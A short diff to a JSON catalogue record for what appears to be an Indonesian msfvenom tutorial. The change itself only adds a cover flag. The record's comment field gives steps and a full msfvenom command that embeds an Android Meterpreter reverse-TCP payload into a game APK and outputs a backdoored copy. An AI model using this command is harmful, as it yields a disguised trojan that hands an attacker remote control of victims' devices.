@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/11762?v=1795440690",
   "cover_og_url": "/cover/11762/og?v=1795440690",
+  "has_cover": false,
   "url": "/book/msf-embed-msf-exploit-dengan-msfvenom-onno-widodo-purbo/",
   "rating": null,
   "comment": "Install apt-get install google-android-build-tools-installer zipalign pilih situs https://dl.google.com/ untuk download apt-get install zipalign apktool Jalankan (untuk PongGame.apk) msfvenom -x PongGame.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895 -o PongGame_backdoored.apk",
